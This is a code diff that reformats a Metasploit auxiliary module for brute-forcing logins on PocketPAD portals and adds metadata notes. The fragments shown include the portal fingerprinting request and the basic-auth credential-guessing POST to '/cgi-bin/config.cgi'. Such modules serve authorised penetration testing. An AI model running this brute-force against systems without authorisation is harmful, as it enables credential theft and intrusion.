@@ -9,19 +9,26 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::AuthBrute
   include Msf::Auxiliary::Scanner
 
-  def initialize(info={})
-    super(update_info(info,
-    'Name'           => 'PocketPAD Login Bruteforce Force Utility',
-    'Description'    => %{
-      This module scans for PocketPAD login portal, and
-      performs a login bruteforce attack to identify valid credentials.
-    },
-    'Author'         =>
-      [
-        'Karn Ganeshen <KarnGaneshen[at]gmail.com>',
-      ],
-    'License'        => MSF_LICENSE
-    ))
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'PocketPAD Login Bruteforce Force Utility',
+        'Description' => %q{
+          This module scans for PocketPAD login portal, and
+          performs a login bruteforce attack to identify valid credentials.
+        },
+        'Author' => [
+          'Karn Ganeshen <KarnGaneshen[at]gmail.com>',
+        ],
+        'License' => MSF_LICENSE,
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     deregister_options('HttpUsername', 'HttpPassword')
   end
@@ -44,10 +51,11 @@ class MetasploitModule < Msf::Auxiliary
   def is_app_popad?
     begin
       res = send_request_cgi(
-      {
-        'uri'       => '/',
-        'method'    => 'GET'
-      })
+        {
+          'uri' => '/',
+          'method' => 'GET'
+        }
+      )
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError
       vprint_error("HTTP Connection Failed...")
       return false
@@ -97,14 +105,15 @@ class MetasploitModule < Msf::Auxiliary
     vprint_status("Trying username:#{user.inspect} with password:#{pass.inspect}")
     begin
       res = send_request_cgi(
-      {
-        'uri'       => '/cgi-bin/config.cgi',
-        'method'    => 'POST',
-        'authorization' => basic_auth(user,pass),
-        'vars_post'    => {
-          'file' => "configindex.html"
+        {
+          'uri' => '/cgi-bin/config.cgi',
+          'method' => 'POST',
+          'authorization' => basic_auth(user, pass),
+          'vars_post' => {
+            'file' => "configindex.html"
           }
-      })
+        }
+      )
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
       vprint_error("HTTP Connection Failed...")
       return :abort
